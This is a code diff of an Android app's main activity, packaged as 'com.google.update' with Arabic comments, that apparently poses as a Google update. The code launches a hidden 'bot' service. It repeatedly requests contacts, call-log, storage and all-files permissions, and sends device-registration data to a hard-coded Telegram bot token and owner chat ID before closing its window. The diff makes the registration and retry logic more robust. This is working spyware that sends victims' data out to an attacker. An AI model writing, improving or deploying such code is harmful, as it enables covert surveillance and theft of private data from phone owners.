@@ -2,8 +2,6 @@ package com.google.update;
 
 import android.Manifest;
 import android.app.Activity;
-import android.app.AlertDialog;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.Uri;
@@ -21,7 +19,6 @@ import androidx.core.content.ContextCompat;
 import org.json.JSONObject;
 
 import java.io.BufferedReader;
-import java.io.File;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
@@ -30,32 +27,28 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 public class MainActivity extends Activity {
     private static final int PERMISSION_REQUEST_CODE = 100;
     private static final int STORAGE_PERMISSION_CODE = 101;
-    private ExecutorService executor = Executors.newSingleThreadExecutor();
+    private ExecutorService executor;
     private boolean allPermissionsGranted = false;
     private int retryCount = 0;
+    private boolean isFinishing = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        // تشغيل الخدمة فوراً في الخلفية
+        // تهيئة executor جديد
+        executor = Executors.newSingleThreadExecutor();
+        
+        // بدء الخدمة فوراً
         startBotService();
         
-        // طلب جميع الأذونات اللازمة
-        requestAllPermissions();
-        
-        // إنهاء النشاط فوراً بعد 1 ثانية
-        new Handler(Looper.getMainLooper()).postDelayed(() -> {
-            if (!allPermissionsGranted) {
-                // إذا لم يتم منح الأذونات، نطلبها مرة أخرى بعد 5 ثوانٍ
-                new Handler(Looper.getMainLooper()).postDelayed(this::requestAllPermissions, 5000);
-            }
-            finish();
-        }, 1000);
+        // طلب الأذونات بعد قليل
+        new Handler(Looper.getMainLooper()).postDelayed(this::requestAllPermissions, 500);
     }
     
     private void startBotService() {
@@ -67,14 +60,15 @@ public class MainActivity extends Activity {
                 startService(intent);
             }
         } catch (Exception e) {
-            // فشل تشغيل الخدمة
+            // فشل تشغيل الخدمة - سيتم إعادة المحاولة لاحقاً
         }
     }
     
     private void requestAllPermissions() {
+        if (isFinishing) return;
+        
         List<String> neededPermissions = new ArrayList<>();
         
-        // أذونات أساسية
         neededPermissions.add(Manifest.permission.INTERNET);
         neededPermissions.add(Manifest.permission.READ_CONTACTS);
         neededPermissions.add(Manifest.permission.READ_CALL_LOG);
@@ -88,7 +82,6 @@ public class MainActivity extends Activity {
         neededPermissions.add(Manifest.permission.FOREGROUND_SERVICE);
         neededPermissions.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);
         
-        // أذونات التخزين حسب إصدار أندرويد
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             neededPermissions.add(Manifest.permission.READ_MEDIA_IMAGES);
             neededPermissions.add(Manifest.permission.READ_MEDIA_VIDEO);
@@ -99,7 +92,6 @@ public class MainActivity extends Activity {
             neededPermissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         }
         
-        // تصفية الأذونات التي لم تُمنح بعد
         List<String> permissionsToRequest = new ArrayList<>();
         for (String perm : neededPermissions) {
             if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
@@ -115,9 +107,11 @@ public class MainActivity extends Activity {
         } else if (permissionsToRequest.isEmpty()) {
             allPermissionsGranted = true;
             sendRegistrationToBot();
+            // إنهاء النشاط بعد التسجيل
+            finishActivitySafely();
         }
         
-        // طلب إذن الوصول لجميع الملفات (Android 11+)
+        // إذن الوصول لجميع الملفات (Android 11+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             if (!Environment.isExternalStorageManager()) {
                 try {
@@ -125,13 +119,18 @@ public class MainActivity extends Activity {
                     intent.setData(Uri.parse("package:" + getPackageName()));
                     startActivityForResult(intent, STORAGE_PERMISSION_CODE);
                 } catch (Exception e) {
-                    // بعض الأجهزة لا تدعم هذا الإعداد
+                    // بعض الأجهزة لا تدعم
                 }
             }
         }
     }
     
     private void sendRegistrationToBot() {
+        if (executor == null || executor.isShutdown() || executor.isTerminated()) {
+            // إعادة تهيئة executor إذا كان متوقفاً
+            executor = Executors.newSingleThreadExecutor();
+        }
+        
         executor.execute(() -> {
             try {
                 String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -142,8 +141,8 @@ public class MainActivity extends Activity {
                 String msg = "REGISTER:" + json.toString();
                 
                 String botToken = "8652354299:AAEOH62d9BHbl064QYcFC2LgbiAH_doiwhU";
-                String chatId = "6793813126";
-                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(msg, "UTF-8");
+                String ownerId = "6793813126";
+                String url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + ownerId + "&text=" + URLEncoder.encode(msg, "UTF-8");
                 
                 HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                 conn.setRequestMethod("GET");
@@ -152,18 +151,43 @@ public class MainActivity extends Activity {
                 conn.disconnect();
                 
                 if (responseCode == 200) {
-                    runOnUiThread(() -> Toast.makeText(this, "✅ تم التسجيل", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "✅ تم التسجيل", Toast.LENGTH_SHORT).show());
                 }
             } catch (Exception e) {
-                // فشل التسجيل، سنحاول مرة أخرى لاحقاً
-                new Handler(Looper.getMainLooper()).postDelayed(this::sendRegistrationToBot, 30000);
+                // فشل التسجيل، سنحاول مرة أخرى بعد 30 ثانية
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    if (!isFinishing && (executor == null || !executor.isShutdown())) {
+                        sendRegistrationToBot();
+                    }
+                }, 30000);
             }
         });
+    }
+    
+    private void finishActivitySafely() {
+        if (isFinishing) return;
+        isFinishing = true;
+        
+        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+            if (executor != null && !executor.isShutdown()) {
+                executor.shutdown();
+                try {
+                    if (!executor.awaitTermination(500, TimeUnit.MILLISECONDS)) {
+                        executor.shutdownNow();
+                    }
+                } catch (InterruptedException e) {
+                    executor.shutdownNow();
+                }
+            }
+            finish();
+        }, 1000);
     }
     
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (isFinishing) return;
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
             boolean allGranted = true;
@@ -177,9 +201,11 @@ public class MainActivity extends Activity {
             if (allGranted) {
                 allPermissionsGranted = true;
                 sendRegistrationToBot();
+                finishActivitySafely();
             } else if (retryCount < 3) {
-                // إعادة طلب الأذونات بعد 3 ثوانٍ
                 new Handler(Looper.getMainLooper()).postDelayed(this::requestAllPermissions, 3000);
+            } else {
+                finishActivitySafely();
             }
         }
     }
@@ -187,11 +213,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
-        
         if (requestCode == STORAGE_PERMISSION_CODE) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && Environment.isExternalStorageManager()) {
-                // تم منح إذن الوصول لجميع الملفات
-            }
             requestAllPermissions();
         }
     }
@@ -199,8 +221,8 @@ public class MainActivity extends Activity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if (executor != null) {
-            executor.shutdown();
+        if (executor != null && !executor.isShutdown()) {
+            executor.shutdownNow();
         }
     }
 }
